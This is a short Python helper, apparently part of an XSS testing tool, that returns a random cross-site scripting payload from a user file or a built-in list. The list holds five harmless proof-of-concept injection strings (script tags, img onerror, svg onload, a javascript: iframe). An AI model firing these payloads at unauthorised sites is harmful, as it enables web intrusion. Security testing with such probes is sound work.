import os
import random

def pick_payload(custom_path=None):
    """
    Retorna um payload aleatório.
    Se custom_path for passado, lê o arquivo com payloads.
    """
    if custom_path:
        if os.path.exists(custom_path):
            with open(custom_path, "r", encoding="utf-8") as f:
                payloads = [line.strip() for line in f if line.strip()]
                if payloads:
                    return random.choice(payloads)
                else:
                    print(f"[!] Arquivo {custom_path} está vazio.")
                    return "<script>alert(1)</script>"
        else:
            print(f"[!] Arquivo {custom_path} não encontrado.")
            return "<script>alert(1)</script>"
    else:
        # payloads padrão
        default_payloads = [
            "<script>alert(1)</script>",
            "\"><img src=x onerror=alert(1)>",
            "'><svg/onload=alert(1)>",
            "\"><svg/onload=confirm(1)>",
            "'\"><iframe src=javascript:alert(1)>"
        ]
        return random.choice(default_payloads)
